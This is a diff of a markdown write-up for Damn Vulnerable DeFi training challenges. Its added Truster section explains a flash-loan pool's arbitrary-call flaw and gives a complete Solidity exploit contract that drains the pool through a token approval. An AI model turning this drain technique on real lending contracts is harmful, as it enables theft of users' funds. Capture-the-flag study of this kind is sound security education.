@@ -42,7 +42,6 @@ function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amoun
 ```
 
 </details>
-<br>
 
 There is a difference between `totalSupply` and `totalAssets`. The `totalSupply` refers to the total amount of tokens that the `vault` has minted. Then, the `totalAssets` refers to all amount token DVT that the `vault` holds. So, if someone makes a transfer to `vault` with token DVT, The `totalAssets` will increase, creating a mismatch between `totalSupply` and `totalAssets`.
 
@@ -60,7 +59,7 @@ There is a difference between `totalSupply` and `totalAssets`. The `totalSupply`
 
 ### 2. Naive Receiver
 
-On this topic, we work with flashloan, delegatecall and EIP-712 as well. In this case, the aims of the chalengge is moving all funds into recovery address and spending player funds. If we are not working with delegatecall, it is difficult to imagine how we would have difficult with it. Also, EIP-712 has it's own difficulty. In short, i have a scenario that :
+In this topic, we work with flashloan, delegatecall and EIP-712 as well. In this case, the aims of the chalengge is moving all funds into recovery address and spending player funds. If we are not working with delegatecall, it is difficult to imagine how we would have difficult with it. Also, EIP-712 has it's own difficulty. In short, i have a scenario that :
 - make 10 flashloans to spend player funds
 - make one transaction to move all of funds to the recovery address
 - keep all commands with the encode function with ABI
@@ -105,3 +104,74 @@ function test_naiveReceiver() public checkSolvedByPlayer {
 </details>
 
 ### 3. Truster
+
+Also in this topic, we work again with flashloan. The story that is the deployer sends many funds to the lender pool. If we are serious about reading the code, there are many things that look weird. Let focus with the following code below : 
+
+<details>
+
+<summary> Code </summary>
+
+```javascript
+function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
+        external
+        nonReentrant
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+
+        token.transfer(borrower, amount);
+@>      target.functionCall(data);
+
+@>      if (token.balanceOf(address(this)) < balanceBefore) {
+@>          revert RepayFailed();
+        }
+
+        return true;
+    }
+```
+
+</details>
+
+After seing the code, we must have some questions. Why does the protocol allow the low-level calls with unclear purposes? It can enable a players to set up the protocol at their will. So, the scenario would be :
+- Take a flashloan with a zero amount
+- Using a low-level call to get approval from the protocol for the attacker's address
+- the attacker makes the transfer directly with the address token.
+
+<details>
+
+<summary> Solution </summary>
+
+```javascript
+function test_truster() public checkSolvedByPlayer {
+        MaliciousUser attacker = new MaliciousUser(address(token), address(pool), recovery);
+        attacker.attack();
+    }
+
+contract MaliciousUser {
+    DamnValuableToken token;
+    TrusterLenderPool pool;
+    address recovery;
+
+    constructor(address _token, address _pool, address _recovery){
+        token = DamnValuableToken(_token);
+        pool = TrusterLenderPool(_pool);
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        uint256 amountOfPool = token.balanceOf(address(pool));
+
+        pool.flashLoan({
+            amount: 0,
+            borrower: address(this),
+            target: address(token),
+            data: abi.encodeWithSignature("approve(address,uint256)", address(this), amountOfPool)
+        });
+
+        token.transferFrom(address(pool), recovery, amountOfPool);
+    }
+    
+}
+```
+
+</details>
